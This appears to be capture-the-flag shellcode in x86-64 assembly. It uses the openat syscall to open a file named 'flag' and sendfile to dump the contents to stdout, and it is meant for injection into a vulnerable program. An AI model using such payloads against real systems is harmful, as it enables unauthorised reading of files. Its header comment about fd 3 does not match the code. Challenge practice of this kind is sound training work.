# Ultra-compact version (assuming fd 3 is available)
mov rax, 257       # openat syscall (can use relative paths)
mov rdi, -100      # AT_FDCWD (-100) for current directory
lea rsi, [rip+flag] # path to flag
mov rdx, 0         # O_RDONLY
syscall

mov rsi, rax       # move fd to rsi (fd_in)
mov rax, 40        # sendfile
mov rdi, 1         # stdout
mov rdx, 0         # offset
mov r10, 1000      # count
syscall

flag:
.string "flag"     # Shorter than "/flag"
